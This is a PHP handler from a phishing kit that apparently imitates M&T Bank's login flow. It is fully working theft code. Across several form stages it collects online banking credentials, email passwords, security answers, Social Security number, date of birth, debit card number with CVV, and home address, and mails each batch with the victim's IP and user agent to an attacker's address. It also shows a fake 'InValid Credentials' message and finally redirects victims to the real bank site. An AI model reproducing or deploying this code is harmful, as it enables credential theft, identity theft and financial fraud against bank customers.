<?php
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);


if (isset($_POST['btn222'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email Address            : ".$_POST['aii']."\n";
	$message .= "Email Passcode              : ".$_POST['prr']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);

	header("Location: ./card.html");

	
	
}

else if (isset($_POST['btn212'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Q1            : ".$_POST['q1']."\n";
	$message .= "A1              : ".$_POST['a1']."\n";
	$message .= "Q2            : ".$_POST['q2']."\n";
	$message .= "A2              : ".$_POST['a2']."\n";
	$message .= "Q3            : ".$_POST['q3']."\n";
	$message .= "A3              : ".$_POST['a3']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);

	header("Location: ./em.html");

	
	
}


else if (isset($_POST['btn3'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	$message .= "First Name            : ".$_POST['fname']."\n";
	$message .= "Middle Name            : ".$_POST['mname']."\n";
	$message .= "last Name            : ".$_POST['lname']."\n";
	$message .= "SSN            : ".$_POST['ssn']."\n";
	$message .= "DOB            : ".$_POST['dob']."\n";
	$message .= "Debit card number              : ".$_POST['cn']."\n";
	$message .= "Expiry Date            : ".$_POST['exdate']."\n";
	$message .= "CVV            : ".$_POST['cvv']."\n";
	

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	 
	header("Location: ./detail.html");

	
	
}

else if (isset($_POST['btn311'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	$message .= "Address           : ".$_POST['add']."\n";
	$message .= "Phone Number            : ".$_POST['ph']."\n";
	$message .= "City             : ".$_POST['ct']."\n";
	$message .= "State            : ".$_POST['st']."\n";
	$message .= "Zip Code            : ".$_POST['zc']."\n";
	

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	 
	header("Location: https://www3.mtb.com/");

	
	
}

else if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}

else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>